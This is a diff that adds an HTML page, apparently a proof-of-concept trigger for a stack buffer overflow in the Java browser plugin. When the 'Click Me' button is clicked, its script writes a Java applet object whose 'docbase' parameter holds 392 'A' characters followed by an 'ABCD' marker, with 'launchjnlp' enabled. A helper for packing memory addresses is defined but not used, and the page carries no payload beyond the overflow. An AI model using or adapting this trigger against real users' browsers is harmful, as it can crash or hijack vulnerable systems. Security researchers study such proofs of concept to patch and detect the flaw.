@@ -1,0 +1,34 @@
+<html>
+<head>
+   <link rel="shortcut icon" href="http://127.0.0.1:9999/x.ico" />
+   <script>
+   function packv(n) {
+      var s = new Number(n).toString(16);
+      while(s.length < 8) s = "0" + s;
+      return(unescape("%u" + s.substring(4,8) + "%u" + s.substring(0,4)));
+   }
+
+   function trigger() {
+      var buf = "";
+
+      //A's
+      for(i = 0; i < 392; i++)
+         buf += unescape("%41");
+      
+      buf += unescape("%41%42%43%44");
+
+      var htmlTags =
+         "<object type='application/x-java-applet'>" +
+         "<param name='launchjnlp' value='1'>" +
+         "<param name='docbase' value='" + buf + "'>" +
+         "</object>";
+
+      document.write(htmlTags);
+   }
+   </script>
+</head>
+<body>
+   <input type="button" value="Click Me" onclick="trigger()">
+</body>
+</html>
+
